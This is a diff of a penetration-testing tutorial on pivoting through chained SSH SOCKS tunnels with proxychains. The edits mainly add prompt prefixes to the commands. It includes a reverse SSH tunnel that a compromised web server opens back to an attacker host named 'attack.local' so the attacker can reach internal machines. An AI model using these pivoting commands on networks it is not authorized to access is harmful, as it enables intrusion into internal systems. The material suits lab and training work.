@@ -59,7 +59,7 @@ socks4  127.0.0.1 8888
 Once this is in place, you can use the following command to execute commands through the tunnel, and the requests will be performed by `jumpbox1.local`. 
 
 ```
-proxychains4 -f ~/new-proxychains.conf curl http://jumpbox2.local
+they@attack.local:~$ proxychains4 -f ~/new-proxychains.conf ssh jumpbox2.local
 ```
 
 ## But we still can't talk to `destbox.local` ?
@@ -69,7 +69,7 @@ they@attack.local:~$ ssh user@jumpbox1.local 'ssh -f -N -D 127.0.0.1:9999 user@j
 
 OR (as in video), just ssh to jumpbox1.local and run:
 
-ssh -f -N -D 127.0.0.1:9999 user@jumpbox2.local
+they@jumpbox1.local:~$ ssh -f -N -D 127.0.0.1:9999 user@jumpbox2.local
 ```
 And modify our `new-proxychains.conf` file to include the newly created tunnel/proxy between `jumpbox1.local` and `jumpbox2.local`
 ```
@@ -87,7 +87,7 @@ socks4  127.0.0.1 9999
 ```
 Now, try again...
 ```
-proxychains4 -f ~/new-proxychains.conf curl http://destbox.local
+they@attack.local:~$ proxychains4 -f ~/new-proxychains.conf curl http://destbox.local
 ```
 And voila! We can talk to `destbox.local` through two tunnels/proxies.
 
@@ -103,15 +103,15 @@ So you have a shell on a box, but can't hit ssh on it? Pretty common as web serv
 You'll want to start an ssh server on your box, probably with `systemctl start sshd` and then I'd `cat ~/.ssh/*.pub` on `jumpbox1` and add that to whatever `ssh` user you plan to use (not a bad idea to create a separate user for this and [restrict accordingly to just tunnels](https://unix.stackexchange.com/a/14313), but you do you...)  
 Once that is complete, from the jumpbox, you'll run
 ```
-ssh -f -N -R 2222:127.0.0.1:22 <you>@attack.local
+they@jumpbox1.local:~$ ssh -f -N -R 2222:127.0.0.1:22 <you>@attack.local
 ```
 Now, hop back to your attack box and run `ss -tlpn | grep 2222` and you should see the new listening port on 127.0.0.1. Now, just create your initial SOCKS proxy through that new tunnel (or use it to ssh into wordpress directly from your machine)
 ```
-ssh -f -N -D 127.0.0.1:8888 <jumpbox1-user>@127.0.0.1 -p 2222
+they@attack.local:~$ ssh -f -N -D 127.0.0.1:8888 <jumpbox1-user>@127.0.0.1 -p 2222
 ````
 Or, if you want a oneliner that can do it all from `jumpbox1.local`
 ```
-ssh -f -R 2222:127.0.0.1:22 attack.local "ssh -f -N -D 8888 127.0.0.1 -p 2222"
+they@jumpbox1.local:~$ ssh -f -R 2222:127.0.0.1:22 attack.local "ssh -f -N -D 8888 127.0.0.1 -p 2222"
 ```
 And magic happens...
 
